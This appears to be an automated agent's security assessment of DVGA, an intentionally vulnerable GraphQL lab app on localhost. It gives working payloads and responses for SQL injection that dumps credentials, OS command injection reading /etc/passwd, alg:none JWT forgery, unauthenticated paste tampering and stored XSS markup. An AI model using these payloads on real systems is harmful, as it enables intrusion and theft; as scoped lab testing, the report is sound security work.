# Security assessment report: DVGA at http://127.0.0.1:5013

**Scope:** 127.0.0.1:5013 only. I did no brute force, denial of service or data destruction.

**Stack:** Python GraphQL app (Flask and Graphene style) with SQLite 3.40.1.

**Notes:**
- Everything runs through one `/graphql` endpoint, which accepts JSON POST.
- There are 19 documented queries and mutations.
- Commands and responses below are abbreviated. `G=http://127.0.0.1:5013/graphql`, and every request sends `Content-Type: application/json`.

---

## 1. SQL injection in `pastes(filter:)` (critical)
**Class:** SQL injection (UNION-based). The backend is SQLite.

**Request:**
```
POST /graphql
{"query":"{ pastes(filter:\"zz' UNION SELECT id,username,password,1,1,1,1,1 FROM users --\"){id title content} }"}
```

**Response:**
```
{"data":{"pastes":[{"id":"1","title":"admin","content":"changeme"},{"id":"2","title":"operator","content":"password123"},{"id":"3","title":"zed1","content":"pw123"}]}}
```

**Controls:**
- `filter:"zzzz"` returns `[]`.
- `filter:"x' OR 1=1--"` returns every paste, including private ones.
- A single quote returns an empty result, which shows the quote breaks the SQL.
- `UNION SELECT 1,sqlite_version(),...` returns `3.40.1`.
- A `sqlite_master` dump lists the tables `users, audits, owners, servermode, pastes`.

**Impact:** an anonymous user can read the whole database, including the plaintext credentials of every user.

---

## 2. Plaintext password storage, exposed through the SQL injection (high)
**Class:** Sensitive data exposure and weak credential storage.

**Evidence:** the response in finding 1 returns `admin:changeme`, `operator:password123` and my own account `zed1:pw123`. They are stored and returned in clear text. The `users` GraphQL field masks them as `******`, but the SQL injection bypasses that.

**Impact:** a database read gives immediate account takeover. The admin credentials also unlock finding 3.

---

## 3. OS command injection and RCE in `systemDiagnostics(cmd:)` (critical)
**Class:** OS command injection, reached through the admin credentials from finding 2.

**Request:**
```
{"query":"{ systemDiagnostics(username:\"admin\",password:\"changeme\",cmd:\"uname -a; head -3 /etc/passwd\") }"}
```

**Response:**
```
"Linux f3d951dcda04 7.0.0-43-generic ... x86_64 GNU/Linux\nroot:x:0:0:root:/root:/bin/bash\ndaemon:..."
```

**Controls:**
- `cmd:"id"` returns `uid=1000(dvga)`.
- With a wrong password the result is `"Password Incorrect"`.
- Reading `/proc/self/environ` worked and exposed environment variables.

**Impact:** remote code execution as user `dvga`. It needs only credentials that finding 1 hands out, so it is reachable without any account.

---

## 4. OS command injection in `systemDebug(arg:)`, unauthenticated (critical)
**Class:** OS command injection with no authentication.

**Request:**
```
{"query":"{ systemDebug(arg:\"; id\") }"}
```

**Response:**
```
"PID TTY TIME CMD\n 1 ? 00:00:00 python\n 24 ? 00:00:00 sh\n 25 ? 00:00:00 ps\nuid=1000(dvga) gid=1000(dvga) groups=1000(dvga)\n"
```

**Control:** with `arg:"x"` the output is a plain `ps x` listing.

**Impact:** anonymous RCE.

## 5. JWT signature not verified, so any user can be impersonated (critical)
**Class:** Broken authentication and token handling.

**Request 1:** an `alg:none` token with `identity:"admin"` and no signature.
```
{"query":"{ me(token:\"<b64 {typ:JWT,alg:none}>.<b64 {type:access,identity:admin,exp:9999999999}>.\"){id username} }"}
```
**Response:** `{"data":{"me":{"id":"1","username":"admin"}}}`

**Request 2:** my own valid HS256 header, a forged `identity:"admin"` payload and a junk signature `AAAA`.
**Response:** `{"data":{"me":{"id":"1","username":"admin"}}}`

**Control:** my genuine token returns `{"id":"3","username":"zed1"}`.

**Impact:** anyone can become any user, including admin, without knowing a secret. Tokens are passed as a query argument (`me(token:)`) instead of an `Authorization` header, so they end up in logs and the audit table. The `Authorization: Bearer` header is ignored entirely.

---

## 6. Missing authentication and authorization on paste mutations (high)
**Class:** Broken access control (IDOR / BFLA).

**Request:** anonymous, with no token.
```
{"query":"mutation{ editPaste(id:1,content:\"pwned\"){paste{id content}} }"}
```

**Response:** `{"data":{"editPaste":{"paste":{"id":"1","content":"pwned"}}}}`

I then restored the original content.

**Other unauthenticated calls that worked:**
- `deletePaste(id:17)` returned `{"result":true}`. It was my own test paste.
- `createPaste` returns a paste owned by `DVGAUser` (id 1).
- `paste(id:3)` and `pastes(public:false)` return other users' private pastes.
- `readAndBurn(id:14)` read and destroyed a burn paste.

**Impact:** anyone can read, modify or delete any paste. Pastes marked `public:false` are still returned (`pastes(public:false)` lists ids 1 and 2).

---

## 7. Unauthenticated information disclosure through introspection and the audit log (medium)
**Class:** Information disclosure.

**Requests:**
- `{__schema{queryType{fields{name}} mutationType{fields{name args{name}}}}}` returned the full schema, including `systemDebug`, `systemDiagnostics`, `deleteAllPastes`, `importPaste` and `uploadPaste`.
- `{ audits{id gqloperation gqlquery timestamp} }` returned other users' queries. For example, it returned my `createUser` and `login` mutations. The passwords were masked as `*****`.
- `{ usrs }` returned `Did you mean "users"?`, so field-suggestion leakage works even if introspection were disabled.
- `users{id username}` returns the usernames `admin` and `operator`.

**Impact:** the whole attack surface is mapped for an anonymous caller.

---

## 8. Stored, unsanitized input: content and User-Agent (medium, execution unproven)
**Class:** Stored XSS candidate.

**Request:** `createPaste` with `content:"<script>alert(1)</script>"` and header `User-Agent: <img src=x onerror=alert(1)>`.

**Response:** the paste was stored, and `userAgent` is returned verbatim as `<img src=x onerror=alert(1)>`.

**Status:** the server stores and returns the markup unescaped. I did not run a browser, so I did not prove script execution in the HTML pages. The pages build their content client-side from GraphQL, and my `curl` check of `/public_pastes` found no script text in the HTML. This is tentative.

---

## 9. No query cost limits: aliasing and deep nesting (medium)
**Class:** Resource exhaustion controls absent. I did not run an actual denial of service.

**Evidence:**
- A single request with 30 aliases of `systemHealth` was fully executed.
- JSON batch arrays (`[{...},{...}]`) are accepted.
- A circular `pastes{owner{pastes{owner{...}}}}` nest to depth 8 was resolved with no depth limit.

**Impact:** there is no rate limit, depth limit or complexity limit. Combined with batching, this allows amplification of brute-force and denial-of-service attacks.

---

## 10. Account creation without checks, weak cookie and header hygiene (low)
**Class:** Misconfiguration.

**Evidence:**
- `createUser` is open to anonymous callers. It registered `zed1` with the password `pw123`, so there is no password policy.
- The cookie `env=graphiql:disable; Path=/` has no `HttpOnly`, `Secure` or `SameSite` flags. It looks like a client-controlled mode switch. Sending `env=graphiql:enable` to `/graphiql` returned 400, so the cookie had no effect I could show.
- The responses lack `Content-Security-Policy`, `Strict-Transport-Security` and `X-Content-Type-Options`.
- Login returns an identical "Authentication Failure" message for a bad password and an unknown user, so there is no user enumeration through login.
- No login rate limiting was seen, but I did not brute force.

---

## Tested but not proven, or not tested

- **`importPaste` SSRF and command injection:** untested. My first call pointed the target at itself and the service dropped and restarted. It came back on its own after about 15 seconds. The only authorized port is 5013, so I did not try other hosts.
- **`uploadPaste` path traversal:** unproven. `filename:"../zz_trav.txt"` was accepted, but I did not read the file back to prove where it was written.
- **`deleteAllPastes` and `/start_over`:** not run, because they are destructive.
- **Stored XSS execution:** see finding 8. It needs a browser (not run).
- **Token expiry and refresh-token misuse:** not tested beyond finding 5. I did not try to crack the JWT secret, because that would be brute force.
- **CORS:** my preflight request returned no `Access-Control-*` headers, so I saw no permissive CORS policy.
- **Mass assignment:**
  - `UserInput` only accepts `username`, `email` and `password`, with no role field to inject.
  - `createPaste` takes no `owner` or `ownerId` argument, so it cannot be set that way.
  - Unauthenticated `createPaste` always assigns the owner to `DVGAUser`.
  - I found no field the server should own that the client can set.
- **Path traversal on static files:** `/static/..%2f..%2fetc/passwd` and `/static/../app.py` returned 404.
- **[ARM] warning:** it fired on my CORS preflight because of the `Origin: http://evil.example` header value. That was only a header value, and no request was sent to that host.

**Side effects on the target:**
- I overwrote paste 1 and restored it.
- I created pastes and the user `zed1`.
- I deleted my own paste 17.
- I read and burned my own paste 14.
